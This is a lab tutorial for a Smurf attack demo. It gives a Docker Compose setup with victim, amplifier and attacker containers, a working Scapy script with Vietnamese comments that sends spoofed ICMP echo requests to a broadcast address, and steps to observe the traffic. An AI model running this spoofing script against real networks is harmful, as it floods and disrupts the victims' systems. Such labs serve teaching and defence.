# Docker Compose for Smurf Attack Demo


````yaml

services:
  ubuntu-victim:
    image: ubuntu:20.04
    container_name: ubuntu-victim
    networks:
      attack_network:
        ipv4_address: 172.20.0.2
    cap_add:
      - NET_ADMIN
    stdin_open: true
    tty: true
    command: bash -c "apt-get update && apt-get install -y iproute2 iputils-ping net-tools tcpdump && /bin/bash"

  ubuntu-amplifier:
    image: ubuntu:20.04
    container_name: ubuntu-amplifier
    networks:
      attack_network:
        ipv4_address: 172.20.0.3
    cap_add:
      - NET_ADMIN
    stdin_open: true
    tty: true
    sysctls:
      - net.ipv4.ip_forward=1
      - net.ipv4.icmp_echo_ignore_broadcasts=0
    command: bash -c "apt-get update && apt-get install -y iproute2 iputils-ping net-tools tcpdump && /bin/bash"

  kali-attacker:
    image: kalilinux/kali-rolling
    container_name: kali-attacker
    networks:
      attack_network:
        ipv4_address: 172.20.0.4
    cap_add:
      - NET_ADMIN
    stdin_open: true
    tty: true
    volumes:
      - ./attack_scripts:/attack_scripts
    command: bash -c "apt-get update && apt-get install -y python3-pip net-tools iputils-ping tcpdump && pip install scapy && /bin/bash"

networks:
  attack_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
````

Now, create a directory for the attack script and add the Smurf attack script:

````python
from scapy.all import *
import sys

def smurf_attack(target_ip, broadcast_ip, count=100):
    print(f"Thực hiện tấn công Smurf từ IP giả mạo {target_ip} đến broadcast {broadcast_ip}")
    for i in range(count):
        # Tạo gói tin ICMP echo request với địa chỉ nguồn giả mạo là máy nạn nhân
        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()
        send(packet, verbose=0)
        if i % 10 == 0:
            print(f"Đã gửi {i} gói tin...")
    print(f"Hoàn thành tấn công, đã gửi {count} gói tin")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Sử dụng: python smurf_attack.py <địa_chỉ_IP_nạn_nhân> <địa_chỉ_broadcast>")
        sys.exit(1)
    
    target_ip = sys.argv[1]  # IP của máy nạn nhân (Ubuntu 1)
    broadcast_ip = sys.argv[2]  # Địa chỉ broadcast của mạng
    smurf_attack(target_ip, broadcast_ip)

````

## Steps to run the demo:

1. Start all containers:
   ```
   docker-compose up -d
   ```

2. Open three separate terminal windows to monitor each container:

   **Terminal 1 - Victim:**
   ```
   docker exec -it ubuntu-victim bash
   tcpdump -i eth0 icmp
   ```

   **Terminal 2 - Amplifier:**
   ```
   docker exec -it ubuntu-amplifier bash
   tcpdump -i eth0 icmp
   ```

   **Terminal 3 - Attacker:**
   ```
   docker exec -it kali-attacker bash
   cd /attack_scripts
   python3 smurf_attack.py 172.20.0.2 172.20.255.255
   ```

The attack will send 100 ICMP echo requests with the victim's IP as the source to the broadcast address. All hosts (including the amplifier) that respond to broadcast pings will send replies to the victim, potentially overwhelming it.

You'll be able to observe the traffic on both the victim and amplifier containers through tcpdump.